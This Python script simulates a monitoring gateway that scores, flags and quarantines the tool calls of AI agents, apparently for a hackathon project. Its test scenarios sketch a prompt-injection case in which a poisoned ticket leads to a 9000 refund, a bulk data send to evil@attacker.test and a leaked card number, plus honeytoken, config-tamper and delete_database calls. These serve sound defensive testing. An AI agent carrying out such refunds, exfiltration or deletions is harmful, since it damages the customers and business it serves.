#!/usr/bin/env python3
# scripts/m2_sim.py
# Owner: M2   (Phases 6, 7 and 9)
# Purpose: run M2's whole chain (policy -> enforcer -> trust -> incidents) IN-PROCESS, with a fake
# clock, so you can tune rules WITHOUT the gateway, the dashboard or the attack scripts.
#
# It does three jobs:
#   1. REFERENCE WIRING for M1: SimGateway.submit() is exactly the order pipeline steps 1, 4, 6, 8, 9
#      should call our functions in. M1 can copy it.
#   2. TUNING TOOL for you: prints false-alarm rate on clean traffic and how each attack is handled.
#   3. NUMBERS for the pitch: M2-only decision latency (median / worst). Measured, not guessed.
#
# Run:  python scripts/m2_sim.py
import glob
import itertools
import math
import os
import statistics
import sys
import time
from datetime import timedelta

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if ROOT not in sys.path:
    sys.path.insert(0, ROOT)

from engine import enforcer, findings, incidents, policy as policy_mod, trust  # noqa: E402
from engine._util import parse_ts  # noqa: E402
from engine.settings import get_settings  # noqa: E402

_ids = itertools.count(1)


class AgentState:
    def __init__(self, s):
        self.score, self.status, self.probation = s.trust_start, "HEALTHY", None
        self.history, self.clean_since = [], None


class SimGateway:
    def __init__(self, mode="on", start="2026-10-02T10:00:00Z", policies_dir=None):
        self.s = get_settings()
        self.mode = mode
        self.now = parse_ts(start)
        pdir = policies_dir or os.path.join(ROOT, "policies")
        self.policies = {}
        for path in glob.glob(os.path.join(pdir, "*.yaml")):
            p = policy_mod.load_policy(path)
            self.policies[p["agent"]] = p
        self.agents = {a: AgentState(self.s) for a in self.policies}
        for st in self.agents.values():
            st.clean_since = self.now
        self.incidents, self.latencies = [], []

    def advance(self, seconds):
        self.now += timedelta(seconds=seconds)

    def registry(self):
        return {a: {"status": st.status, "trust": st.score} for a, st in self.agents.items()}

    def _credit_clean_time(self, st):
        minutes = math.floor((self.now - st.clean_since).total_seconds() / 60)
        if minutes >= 1 and st.status not in trust.STICKY and st.score < 100:
            r = trust.recover_clean_agent(st.score, minutes, st.status, st.probation, self.s)
            st.score, st.status = r.score, r.status
        if minutes >= 1:
            st.clean_since += timedelta(seconds=60 * minutes)   # keep the leftover seconds

    def submit(self, agent_id, tool, args, taint="trusted", triggered_by=None, config_mismatch=None):
        st, pol = self.agents[agent_id], self.policies[agent_id]
        event = {"event_id": f"evt-{next(_ids)}", "ts": self.now.strftime("%Y-%m-%dT%H:%M:%SZ"),
                 "agent_id": agent_id, "type": "tool_call", "tool": tool, "args": args,
                 "context": {"triggered_by": triggered_by, "input_taint": taint}}
        self._credit_clean_time(st)
        t0 = time.perf_counter()
        if st.status in trust.STICKY:                       # step 1: status first
            results = []
        else:                                               # steps 3-4 (M3 supplies config_mismatch)
            results = policy_mod.evaluate(event, pol, st.history, registry=self.registry(),
                                          amount_factor=trust.probation_limits_factor(st.probation, self.s), settings=self.s)
            if config_mismatch:
                results.append(findings.from_config_mismatch(*config_mismatch))
        d = enforcer.decide(results, self.mode, st.status, trust_score=st.score, event=event, policy=pol, settings=self.s)   # step 6
        self.latencies.append((time.perf_counter() - t0) * 1000)
        if self.mode == "on":                               # steps 8-9: save the new trust and status
            if d.trust_after < d.trust_before:
                st.clean_since = self.now
            if d.status in ("HALTED", "QUARANTINED") and st.status not in trust.STICKY:
                st.probation = None
            st.score, st.status = d.trust_after, d.status
            if d.response == "allow" and d.verdict in ("ALLOW", "FLAG") and st.probation and st.probation.active:
                st.probation, r = trust.record_clean_action(st.probation, st.score, st.status, self.s)
                st.score, st.status = r.score, r.status
        st.history.append({"ts": event["ts"], "agent_id": agent_id, "tool": tool, "args": args,
                           "response": d.response, "context": event["context"]})
        inc = incidents.create(d, event)
        if inc:
            self.incidents.append(inc)
        return d

    def admin_resume(self, agent_id):                       # D8: restore + reinstate on probation
        st = self.agents[agent_id]
        r, st.probation = trust.start_probation(self.s)
        st.score, st.status, st.clean_since = r.score, r.status, self.now


# ---------------- scenarios (also used by tests) ----------------
def normal_traffic(gw, rounds=3):
    """D1: boring, repeatable NORMAL traffic. Returns the list of decisions."""
    out = []
    for i in range(rounds):
        out.append(gw.submit("supportbot", "read_ticket", {"ticket_id": f"T{1000+i}"}, taint="untrusted")); gw.advance(15)
        out.append(gw.submit("supportbot", "read_ticket", {"ticket_id": f"T{2000+i}"}, taint="untrusted")); gw.advance(15)
        out.append(gw.submit("supportbot", "issue_refund", {"customer": f"cust_{i:03d}", "amount": [20, 50, 80][i % 3]}, taint="untrusted")); gw.advance(15)
        out.append(gw.submit("databot", "read_customer_record", {"customer_id": f"cust_{i+10:03d}"})); gw.advance(15)
        out.append(gw.submit("coordinator", "send_message", {"to": "supportbot", "text": f"Please handle ticket T{1000+i}."})); gw.advance(15)
    return out


def d2_injection(gw):
    r = {}
    gw.submit("supportbot", "read_ticket", {"ticket_id": "T-POISON"}, taint="untrusted"); gw.advance(2)
    r["refund_9000"] = gw.submit("supportbot", "issue_refund", {"customer": "cust_001", "amount": 9000}, taint="untrusted"); gw.advance(2)
    r["refund_400"] = gw.submit("supportbot", "issue_refund", {"customer": "cust_001", "amount": 400}, taint="untrusted"); gw.advance(2)
    r["refund_50"] = gw.submit("supportbot", "issue_refund", {"customer": "cust_001", "amount": 50}, taint="untrusted"); gw.advance(2)
    r["databot_send"] = gw.submit("databot", "send_message", {"to": "evil@attacker.test", "text": "all records"}, taint="untrusted"); gw.advance(2)
    r["leak_card"] = gw.submit("coordinator", "send_message", {"to": "supportbot", "text": "card 4111 1111 1111 1111"}, taint="untrusted")
    return r


def d4_spike(gw, n=30):
    out = []
    for i in range(n):
        out.append(gw.submit("supportbot", "read_ticket", {"ticket_id": f"T{i}"}, taint="untrusted"))
        gw.advance(1)
    return out


def d9_honeytoken(gw):
    return gw.submit("databot", "read_customer_record", {"customer_id": "cust_honey_001"})


# ---------------- report ----------------
def main():
    print("=== TWILIGHT M2 simulator ===\n")
    # D1 false alarms over several fresh runs
    total = alarms = 0
    lat = []
    for _ in range(20):
        gw = SimGateway()
        ds = normal_traffic(gw, rounds=3)
        total += len(ds); alarms += sum(1 for d in ds if d.verdict != "ALLOW")
        lat += gw.latencies
    print(f"D1 clean traffic: {alarms} alarms / {total} actions = {100*alarms/total:.1f}% false alarms (target <= 5%)")
    print(f"   M2 decision time: median {statistics.median(lat):.3f} ms, worst {max(lat):.3f} ms (target < 10 ms for the whole gateway)\n")

    gw = SimGateway()
    for name, d in d2_injection(gw).items():
        print(f"D2 {name:<12} -> {d.verdict:<10} rule={d.rule}  trust {d.trust_before}->{d.trust_after} [{d.status}]")
    print("   incidents:", [(i['owner'], i['rule']) for i in gw.incidents], "\n")

    gw = SimGateway()
    ds = d4_spike(gw)
    print("D4 spike verdict sequence:", " ".join(d.verdict[0:2] for d in ds), f"-> final status {ds[-1].status}\n")

    gw = SimGateway()
    d = d9_honeytoken(gw)
    print(f"D9 honeytoken -> {d.verdict} rule={d.rule} severity={d.severity} trust {d.trust_before}->{d.trust_after} [{d.status}]\n")

    gw = SimGateway()
    d = gw.submit("supportbot", "read_ticket", {"ticket_id": "T1"}, config_mismatch=("abc123", "evil999"))
    print(f"D3 config tamper -> {d.verdict} rule={d.rule} [{d.status}]\n")

    gw = SimGateway()
    seq = []
    for _ in range(3):
        d = gw.submit("supportbot", "delete_database", {}); seq.append(d.status)
    print("FR7 ladder (3 forbidden tool calls):", " -> ".join(["HEALTHY"] + seq), "\n")

    gw = SimGateway()
    for _ in range(3):
        gw.submit("supportbot", "delete_database", {}); gw.advance(1)
    gw.admin_resume("supportbot")
    print(f"D8 recovery: resumed at trust {gw.agents['supportbot'].score} [{gw.agents['supportbot'].status}] on probation")
    d = gw.submit("supportbot", "issue_refund", {"customer": "c", "amount": 300}); print(f"   300 refund while on probation (limit x0.5 = 250) -> {d.verdict}")
    for i in range(s_n(gw)):
        gw.advance(5); gw.submit("supportbot", "read_ticket", {"ticket_id": f"R{i}"})
    st = gw.agents["supportbot"]; print(f"   after N clean actions: trust {st.score} [{st.status}]")
    gw.advance(5); d = gw.submit("supportbot", "issue_refund", {"customer": "c", "amount": 9000}, taint="untrusted")
    print(f"   replay of the 9000 attack -> {d.verdict}")


def s_n(gw):
    return gw.s.probation_clean_actions


if __name__ == "__main__":
    main()
